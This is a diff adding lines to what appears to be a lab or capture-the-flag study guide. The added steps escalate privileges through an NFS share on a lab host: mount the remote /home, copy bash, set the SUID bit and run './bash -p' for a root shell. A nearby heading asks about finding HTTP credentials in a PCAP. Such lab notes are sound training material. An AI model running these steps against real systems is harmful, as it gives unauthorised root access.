@@ -311,6 +311,20 @@ after them, In another terminal:
 * `ls -la`
 * Find the flag: `find / -name "*.txt" -ls 2> /dev/null`
 
+or
+
+* `sudo apt-get install nfs-common`
+* `showmount -e 10.10.1.9` -> we will see /home directory
+* `mkdir /tmp/nfs`
+* `sudo mount -t nfs 10.10.1.9:/home /tmp/nfs`&#x20;
+* `cd /tmp/nfs`
+* `sudo cp /bin/bash`
+* `sudo chmod +s bash` -> it will be highlighted in red
+* login back to the target machine using ssh
+* `cd /home`
+* `ls` -> here we will have bash
+* `./bash -p`
+
 ## WireShark
 
 ### Which machine started DOS attack? DDOS attack happened on which IP? Find out http crediantls from PCAP file?&#x20;
